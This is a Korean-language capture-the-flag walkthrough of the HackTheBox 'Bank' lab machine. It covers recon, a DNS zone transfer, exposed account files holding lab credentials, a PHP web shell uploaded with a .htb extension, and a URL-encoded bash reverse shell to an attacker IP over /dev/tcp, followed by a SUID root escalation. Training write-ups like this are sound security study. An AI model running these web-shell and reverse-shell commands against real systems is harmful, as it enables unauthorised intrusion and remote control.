# Bank - HackTheBox
## Recon
```bash
sudo nmap -p 22,53,80 -sC -sV -vv -oA bank 10.10.10.29
```
<img width="1105" height="557" alt="image" src="https://github.com/user-attachments/assets/1c1f63c7-a7ad-4491-8e83-a486a90ad8e9" />

- SSH(22)
- DNS(53)
- HTTP(80)

---
## DNS
- `Apache` 서버가 작동되고 있는 것은 확인되나, 도메인 이름은 확인되지 않음.
- `bank.htb`라고 가정.
```bash
dig axfr bank.htb @10.10.10.29
```
<img width="1105" height="308" alt="image" src="https://github.com/user-attachments/assets/78466f2a-31ad-42bb-8fb4-898323cf2cef" />

<br>
<br>

- `/etc/hots`에 `bank.htb`와 `chris.bank.htb` 등록.
<img width="1105" height="68" alt="image" src="https://github.com/user-attachments/assets/07bf50f8-307f-47b4-8a63-dc20408e8172" />

---
## HTTP
- `bank.htb` 접속.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/296b6051-6019-4b2b-b379-b2382d66017f" />

### banner grabbing
<img width="1105" height="575" alt="image" src="https://github.com/user-attachments/assets/0b773c9f-ca2e-4132-b630-0df2a786bc98" />

### gobuster
- 시간이 좀 걸린 후에 `/balance-transfer`를 발견.
<img width="1105" height="520" alt="image" src="https://github.com/user-attachments/assets/59407296-1648-4870-a953-4408c7decada" />

### Upload File vulnerable
- 많은 수의 `acc`파일들을 확인할 수 있는데, 내용이 암호화가 되어 있음.
<img width="1105" height="267" alt="image" src="https://github.com/user-attachments/assets/c94b34c6-aecd-47d6-8ef8-335604635caf" />

<br>
<br>

- `curl`를 통해서 `acc`파일들만 따로 추출.
```bash
curl -Ls http://bank.htb/balance-transfer|grep 'alt="\[   \]"' > files.txt
```
<img width="1105" height="328" alt="image" src="https://github.com/user-attachments/assets/28049e35-2fef-4788-b617-8ab58878f0ae" />

<br>
<br>

- `vim`으로 가공하여 `acc`파일명만 남김.
<img width="1105" height="239" alt="image" src="https://github.com/user-attachments/assets/4e82e2e4-2717-4887-83fe-395aacf1e778" />

<br>
<br>

- 각각의 파일들에 대해서 바이트 개수를 출력해서 `result.txt`로 생성.
```bash
for id in $(cat files.txt);do echo $id\|$(curl -s "http://bank.htb/balance-transfer/$id"|wc -c) >> result.txt;done
```
<img width="1105" height="239" alt="image" src="https://github.com/user-attachments/assets/c95131c9-50b9-4efd-917b-e5eaf89aa40e" />

<br>
<br>

- `grep`으로 정규식을 사용하여 580번대의 바이트를 제외하면 다른 하나의 파일이 발견됨.
```bash
cat result.txt|grep -v '58[12345]'
```
<img width="1105" height="75" alt="image" src="https://github.com/user-attachments/assets/4c42f127-291a-4287-8cbe-178e5474efb6" />

<br>
<br>

- `chris@bank.htb:!##HTBB4nkP4ssw0rd!##` 계정 발견.
<img width="676" height="268" alt="image" src="https://github.com/user-attachments/assets/5ed51557-8859-48ef-b3c4-f560187e99db" />

<br>
<br>

- `chris@bank.htb:!##HTBB4nkP4ssw0rd!##` 서버 메인페이지 로그인.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/fba205c2-bd47-4e76-ba1f-7f09f7516f06" />

<br>
<br>

- `/support.php` 소스코드를 살펴보니 `htb` 파일을 `php`처럼 실행 가능하다고 입력되어 있음.
<img width="1100" height="356" alt="image" src="https://github.com/user-attachments/assets/fa1114ac-c9ee-4441-a99e-dfac69b32bbe" />

<br>
<br>

- 웹 셸을 복사해와 `htb`파일로 변경.
<img width="1104" height="114" alt="image" src="https://github.com/user-attachments/assets/0c089e1e-fd67-4a8c-8901-4f74796dc787" />

<br>
<br>

- 업로드 파일.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/e3f6a020-a8be-483c-acd4-ede34cededa1" />

<br>
<br>

- 명령어 실행 성공.
```bash
curl -s 'http://bank.htb/uploads/ex.htb?cmd=whoami'
```
<img width="1104" height="130" alt="image" src="https://github.com/user-attachments/assets/4a9a511b-8b8c-4b67-a9c1-f4916c9e544e" />

<br>
<br>

- 리버스 셸 실행.
```bash
curl -s 'http://bank.htb/uploads/ex.htb?cmd=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.16.4%2F80%200%3E%261%22'
```
<img width="1104" height="76" alt="image" src="https://github.com/user-attachments/assets/71ee3ee3-67c2-4a7b-8179-594c0f96e89c" />

<br>
<br>

- 셸 획득.
<img width="1104" height="179" alt="image" src="https://github.com/user-attachments/assets/3b18730c-ab0e-4fc3-bcb6-86d95e555699" />

---
## Privesc
- `/var/htb/bin/emergency`에 SUID가 설정.
<img width="1104" height="44" alt="image" src="https://github.com/user-attachments/assets/77b2e3e3-21d1-4671-8235-d7a2f7a6cbd8" />

<br>
<br>

- 실행을 시켜보니 `root`셸 획득.
<img width="1104" height="61" alt="image" src="https://github.com/user-attachments/assets/0ef0204d-2ac2-492e-9e30-fe77b639f9e6" />

---
## FLAG
- `/home/chris/user.txt`
<img width="1104" height="192" alt="image" src="https://github.com/user-attachments/assets/240fe71f-8365-4bd1-865e-d049c91e8926" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="233" alt="image" src="https://github.com/user-attachments/assets/ecaa4ed3-7029-406a-8e84-b34e9af50a6b" />
